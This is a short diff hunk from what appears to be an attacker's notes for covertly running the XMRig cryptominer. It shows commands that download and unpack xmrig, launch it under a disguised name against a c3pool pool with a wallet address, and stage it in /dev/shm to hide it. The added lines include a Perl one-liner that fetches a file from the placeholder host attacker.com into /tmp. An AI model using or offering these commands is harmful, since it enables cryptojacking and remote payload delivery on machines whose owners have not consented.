@@ -22,6 +22,9 @@ nohup ./moktarr --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDK
 curl -L -o xmrig.tar.gz https://github.com/C3Pool/xmrig-C3/releases/download/v6.24.0-C3/xmrig-v6.24.0-C3-linux-Static.tar.gz
 
 wget -O xmrig.tar.gz https://github.com/C3Pool/xmrig-C3/releases/download/v6.24.0-C3/xmrig-v6.24.0-C3-linux-Static.tar.gz && tar -xzf xmrig.tar.gz && rm -f xmrig.tar.gz
+
+perl -e 'use File::Fetch; my $ff = File::Fetch->new(uri => "http://attacker.com/file"); my $where = $ff->fetch(to => "/tmp") or die $ff->error;'
+
 # Hide in sensible location
 wget -O /dev/shm/xmrig.tar.gz https://github.com/C3Pool/xmrig-C3/releases/download/v6.24.0-C3/xmrig-v6.24.0-C3-linux-Static.tar.gz && tar -xzf /dev/shm/xmrig.tar.gz && rm -f /dev/shm/xmrig.tar.gz
 # straight launch
